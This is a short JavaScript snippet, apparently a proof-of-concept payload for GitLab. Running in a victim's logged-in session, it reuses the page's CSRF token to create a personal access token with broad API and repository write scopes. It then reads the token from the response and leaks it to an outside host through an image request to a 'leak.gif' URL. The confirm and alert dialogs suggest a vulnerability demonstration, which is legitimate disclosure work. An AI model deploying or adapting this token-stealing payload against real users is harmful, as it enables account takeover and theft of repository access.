async function getToken() {
  const formData = new FormData();

  formData.append(
    document.querySelector('meta[name="csrf-param"]').content,
    document.querySelector('meta[name="csrf-token"]').content
  );
  formData.append("personal_access_token[name]", "test");
  formData.append("personal_access_token[scopes][]", "api");
  formData.append("personal_access_token[scopes][]", "read_user");
  formData.append("personal_access_token[scopes][]", "read_repository");
  formData.append("personal_access_token[scopes][]", "write_repository");
  formData.append("personal_access_token[scopes][]", "read_registry");

  const response = await fetch(
    "https://gitlab.com/profile/personal_access_tokens",
    {
      credentials: "include",
      body: formData,
      method: "POST",
      mode: "cors"
    }
  );

  const parser = new DOMParser();
  const doc = parser.parseFromString(await response.text(), "text/html");
  return doc.querySelector("#created-personal-access-token").value;
}

if (confirm("Create an access token?")) {
  getToken().then(token => {
    alert("Created token is: " + token);
    const image = new Image();
    image.src = `//aw.rs/g/leak.gif?token=${token}`;
  });
}
